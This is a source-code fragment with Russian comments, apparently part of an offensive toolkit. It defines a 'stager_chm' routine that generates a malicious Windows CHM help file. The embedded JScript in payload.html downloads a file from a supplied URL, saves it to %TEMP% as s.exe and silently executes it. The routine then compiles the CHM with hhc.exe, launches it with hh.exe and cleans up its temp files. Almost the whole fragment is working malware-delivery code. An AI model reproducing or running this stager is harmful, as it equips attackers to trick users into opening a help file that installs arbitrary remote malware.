    // или %SystemRoot%\hhc.exe
    wchar_t hhc[MAX_PATH] = {0};
    {
        wchar_t pf[MAX_PATH];
        DWORD r = GetEnvironmentVariableW(L"ProgramFiles", pf, MAX_PATH);
        if (r && r < MAX_PATH) {
            // ProgramFiles\HTML Help Workshop\hhc.exe
            wchar_t* pp = pf;
            while (*pp) ++pp;
            const wchar_t hhw[] = L"\\HTML Help Workshop\\hhc.exe";
            for (int i = 0; hhw[i]; ++i) *pp++ = hhw[i];
            *pp = 0;
            if (GetFileAttributesW(pf) != INVALID_FILE_ATTRIBUTES) {
                int n = 0; while (pf[n]) { hhc[n] = pf[n]; ++n; } hhc[n] = 0;
            }
        }
        if (!hhc[0]) {
            // %SystemRoot%\hhc.exe
            GetSystemDirectoryW(hhc, MAX_PATH);
            wchar_t* sp = hhc; while (*sp) ++sp;
            const wchar_t hl[] = L"\\..\\hhc.exe";
            for (int i = 0; hl[i]; ++i) *sp++ = hl[i];
            *sp = 0;
            if (GetFileAttributesW(hhc) == INVALID_FILE_ATTRIBUTES)
                hhc[0] = 0;
        }
    }

    if (!hhc[0]) {
        const char err[] =
            "stager_chm: hhc.exe not found\n"
            "  Install HTML Help Workshop or copy hhc.exe to %SystemRoot%\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Создать temp-директорию с файлами проекта.
    wchar_t tdir[MAX_PATH];
    GetTempPathW(MAX_PATH, tdir);
    wchar_t* tp = tdir; while (*tp) ++tp;
    const wchar_t chmtmp[] = L"chm_stager\\";
    for (int i = 0; chmtmp[i]; ++i) *tp++ = chmtmp[i];
    *tp = 0;
    CreateDirectoryW(tdir, NULL);

    // Собрать пути
    wchar_t html_path[MAX_PATH], hhp_path[MAX_PATH], hhc_path[MAX_PATH];
    int tdl = 0; while (tdir[tdl]) ++tdl;

    // tdir + payload.html
    int i = 0;
    for (; i < tdl; ++i) html_path[i] = tdir[i];
    const wchar_t html_name[] = L"payload.html";
    for (int j = 0; html_name[j]; ++j) html_path[i++] = html_name[j];
    html_path[i] = 0;

    // tdir + project.hhp
    i = 0;
    for (; i < tdl; ++i) hhp_path[i] = tdir[i];
    const wchar_t hhp_name[] = L"project.hhp";
    for (int j = 0; hhp_name[j]; ++j) hhp_path[i++] = hhp_name[j];
    hhp_path[i] = 0;

    // tdir + out.chm
    i = 0;
    for (; i < tdl; ++i) hhc_path[i] = tdir[i];
    const wchar_t chm_name[] = L"out.chm";
    for (int j = 0; chm_name[j]; ++j) hhc_path[i++] = chm_name[j];
    hhc_path[i] = 0;

    // Записать payload.html
    {
        char html[2048];
        int  hp = 0;
        const char h1[] =
            "<html><head><title>Help</title></head><body>\r\n"
            "<script language=\"JScript\">\r\n"
            "var h=new ActiveXObject(\"MSXML2.XMLHTTP.6.0\");\r\n"
            "h.open(\"GET\",\"";
        hp = st_cat(html, hp, (int)sizeof(html), h1);
        hp = st_cat(html, hp, (int)sizeof(html), url);
        const char h2[] =
            "\",false);\r\n"
            "h.send();\r\n"
            "var p=new ActiveXObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")+"
            "\"\\\\s.exe\";\r\n"
            "var s=new ActiveXObject(\"ADODB.Stream\");\r\n"
            "s.Type=1;s.Open();s.Write(h.ResponseBody);s.SaveToFile(p,2);s.Close();\r\n"
            "new ActiveXObject(\"WScript.Shell\").Run(p,0);\r\n"
            "</script></body></html>\r\n";
        hp = st_cat(html, hp, (int)sizeof(html), h2);
        if (!st_write_file(html_path, html, (DWORD)hp)) {
            const char err[] = "stager_chm: failed to write HTML\n";
            out_write(err, sizeof(err) - 1);
            return;
        }
    }

    // Записать project.hhp
    // [OPTIONS] + [FILES] — минимальный проект.
    // Compiled file = абсолютный путь к out.chm
    {
        char hhp[1024];
        int  pp = 0;
        // Конвертировать пути в narrow для .hhp (hhc.exe принимает ANSI)
        char hhc_path_n[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, hhc_path, -1, hhc_path_n, MAX_PATH, NULL, NULL);

        const char hp1[] = "[OPTIONS]\r\nCompatibility=1.1 or later\r\nCompiled file=";
        pp = st_cat(hhp, pp, (int)sizeof(hhp), hp1);
        pp = st_cat(hhp, pp, (int)sizeof(hhp), hhc_path_n);
        const char hp2[] =
            "\r\nDefault topic=payload.html\r\nDisplay compile progress=No\r\n"
            "[FILES]\r\npayload.html\r\n";
        pp = st_cat(hhp, pp, (int)sizeof(hhp), hp2);
        if (!st_write_file(hhp_path, hhp, (DWORD)pp)) {
            const char err[] = "stager_chm: failed to write HHP\n";
            out_write(err, sizeof(err) - 1);
            return;
        }
    }

    // Запустить hhc.exe project.hhp из tdir
    {
        wchar_t cmdline[MAX_PATH * 2];
        wchar_t* cp = cmdline;
        *cp++ = L'"';
        for (wchar_t* hp = hhc; *hp; ++hp) *cp++ = *hp;
        *cp++ = L'"'; *cp++ = L' '; *cp++ = L'"';
        for (wchar_t* hp = hhp_path; *hp; ++hp) *cp++ = *hp;
        *cp++ = L'"'; *cp = 0;

        STARTUPINFOW si;
        rt_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi;
        rt_memset(&pi, 0, sizeof(pi));

        if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            const char err[] = "stager_chm: CreateProcess(hhc.exe) failed\n";
            out_write(err, sizeof(err) - 1);
            return;
        }
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Проверить результат и скопировать в out_path
    if (GetFileAttributesW(hhc_path) == INVALID_FILE_ATTRIBUTES) {
        const char err[] = "stager_chm: hhc.exe did not produce output\n";
        out_write(err, sizeof(err) - 1);
    } else {
        wchar_t wout[MAX_PATH];
        st_to_wide(path, wout, MAX_PATH);
        if (!CopyFileW(hhc_path, wout, FALSE)) {
            const char err[] = "stager_chm: CopyFile to out_path failed\n";
            out_write(err, sizeof(err) - 1);
        } else {
            char msg[512];
            int mp = 0;
            // Запуск: hh.exe "<path>"
            wchar_t cl[MAX_PATH + 16];
            int cp = 0;
            cp = st_wcat(cl, cp, MAX_PATH + 16, L"hh.exe \"");
            cp = st_wcat(cl, cp, MAX_PATH + 16, wout);
                 st_wcat(cl, cp, MAX_PATH + 16, L"\"");

            mp = st_cat(msg, mp, (int)sizeof(msg), "stager_chm: created ");
            mp = st_cat(msg, mp, (int)sizeof(msg), path);
            if (st_spawn(cl)) {
                const char ok[] = " -> spawned hh.exe";
                mp = st_cat(msg, mp, (int)sizeof(msg), ok);
            } else {
                const char fail[] = " -> spawn failed";
                mp = st_cat(msg, mp, (int)sizeof(msg), fail);
            }
            msg[mp++] = '\n'; msg[mp] = 0;
            out_write(msg, mp);
            st_maybe_delete(wout, flags);
        }
    }

    // Очистить temp-папку
    DeleteFileW(html_path);
    DeleteFileW(hhp_path);
    DeleteFileW(hhc_path);
    RemoveDirectoryW(tdir);
}
